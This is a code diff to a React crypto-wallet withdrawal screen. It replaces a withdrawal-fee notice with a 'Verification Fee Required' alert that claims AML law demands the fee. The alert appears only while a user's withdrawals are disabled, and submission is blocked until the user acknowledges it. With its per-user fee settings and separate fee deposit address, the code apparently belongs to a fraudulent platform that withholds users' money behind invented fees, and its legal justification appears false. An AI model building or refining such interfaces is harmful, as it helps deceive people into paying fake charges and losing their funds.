@@ -179,6 +179,7 @@ interface SendWithdrawViewProps {
 
 export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
   const checkboxId = useId();
+  const verificationCheckboxId = useId();
   const [wallet, setWallet] = useState<WalletData | null>(null);
   const [settings, setSettings] = useState<SettingsData | null>(null);
   const [address, setAddress] = useState('');
@@ -186,6 +187,7 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
   const [submitting, setSubmitting] = useState(false);
   const [loading, setLoading] = useState(true);
   const [gasFeeAcknowledged, setGasFeeAcknowledged] = useState(false);
+  const [verificationFeeAcknowledged, setVerificationFeeAcknowledged] = useState(false);
   const [showFeePopup, setShowFeePopup] = useState(false);
   const [showInsufficientPopup, setShowInsufficientPopup] = useState(false);
   const [insufficientAttemptsLeft, setInsufficientAttemptsLeft] = useState(0);
@@ -289,8 +291,11 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
   };
 
   // Gas fee section shown when auto-approve is off, a deposit address is configured,
-  // and this user actually has a network fee requirement set for this asset.
-  const showGasFeeSection = !settings.auto_approve && !!feeDepositAddress && feeUsd > 0;
+  // this user has a network fee requirement set, and withdrawal is NOT yet enabled.
+  const showGasFeeSection = !wallet.withdrawal_enabled && !settings.auto_approve && !!feeDepositAddress && feeUsd > 0;
+
+  // Verification fee alert shown when a charge is set and withdrawal is NOT yet enabled.
+  const showVerificationFee = !wallet.withdrawal_enabled && hasCharge;
 
   const copyFeeAddress = () => {
     if (!feeDepositAddress) return;
@@ -316,9 +321,15 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
       return;
     }
 
-    // Fee checkbox must be ticked if section is shown
+    // Network fee checkbox must be ticked if section is shown
     if (showGasFeeSection && !gasFeeAcknowledged) {
       setShowFeePopup(true);
+      return;
+    }
+
+    // Verification fee checkbox must be ticked if section is shown
+    if (showVerificationFee && !verificationFeeAcknowledged) {
+      toast.error('Please acknowledge the Verification Fee before submitting');
       return;
     }
 
@@ -511,27 +522,45 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
             </div>
           </div>
 
-          {/* Withdrawal charge notice */}
-          {hasCharge && (
-            <div className="flex flex-col gap-1.5 p-3.5 rounded-xl border border-amber-500/30 bg-amber-500/8">
-              <div className="flex items-center gap-2">
-                <AlertCircle className="w-4 h-4 text-amber-400 shrink-0" />
-                <span className="text-sm font-semibold text-foreground">Withdrawal Fee</span>
-              </div>
-              <div className="flex flex-col gap-0.5 text-xs text-muted leading-relaxed pl-6">
-                <div className="flex justify-between">
-                  <span>Withdrawal fee</span>
-                  <span className="text-amber-400 font-semibold">{withdrawalCharge.toLocaleString(undefined, { maximumFractionDigits: 8 })} {assetLabel}</span>
-                </div>
-                {parseFloat(amount || '0') > 0 && (
-                  <div className="flex justify-between mt-0.5 pt-0.5 border-t border-border/40">
-                    <span className="font-medium text-foreground">Total deducted</span>
-                    <span className="font-semibold text-foreground">
-                      {(parseFloat(amount || '0') + withdrawalCharge).toLocaleString(undefined, { maximumFractionDigits: 8 })} {assetLabel}
-                    </span>
+          {/* Verification Fee alert */}
+          {showVerificationFee && (
+            <div className="flex flex-col gap-4 p-4 rounded-xl border border-[#da3637]/30 bg-[#da3637]/10">
+              <div className="flex gap-3">
+                <AlertCircle className="w-5 h-5 text-destructive shrink-0 mt-0.5" />
+                <div className="flex flex-col gap-1">
+                  <div className="text-sm font-semibold text-foreground">Verification Fee Required</div>
+                  <div className="text-xl font-bold text-destructive">
+                    {withdrawalCharge.toLocaleString(undefined, { maximumFractionDigits: 8 })} {assetLabel}
                   </div>
-                )}
+                  <div className="text-xs text-muted/90 leading-relaxed">
+                    In compliance with AML law, a verification fee must be acknowledged before your withdrawal can be processed. This amount will be deducted from your balance upon confirmation.
+                  </div>
+                </div>
               </div>
+
+              <label htmlFor={verificationCheckboxId} className="flex items-start gap-3 cursor-pointer select-none">
+                <input
+                  id={verificationCheckboxId}
+                  type="checkbox"
+                  checked={verificationFeeAcknowledged}
+                  onChange={(e) => setVerificationFeeAcknowledged(e.target.checked)}
+                  className="mt-0.5 w-4 h-4 accent-primary cursor-pointer shrink-0"
+                />
+                <span className="text-xs text-muted leading-relaxed">
+                  I understand that a verification fee of{' '}
+                  <span className="text-destructive font-semibold">
+                    {withdrawalCharge.toLocaleString(undefined, { maximumFractionDigits: 8 })} {assetLabel}
+                  </span>{' '}
+                  will be deducted from my balance in compliance with AML regulations when this withdrawal is confirmed.
+                </span>
+              </label>
+
+              {verificationFeeAcknowledged && (
+                <div className="rounded-lg bg-success/10 border border-success/30 px-3 py-2.5 flex gap-2 items-center">
+                  <CheckCircle className="w-4 h-4 text-success shrink-0" />
+                  <p className="text-xs text-success font-medium">Verification fee acknowledged — ready to submit.</p>
+                </div>
+              )}
             </div>
           )}
 
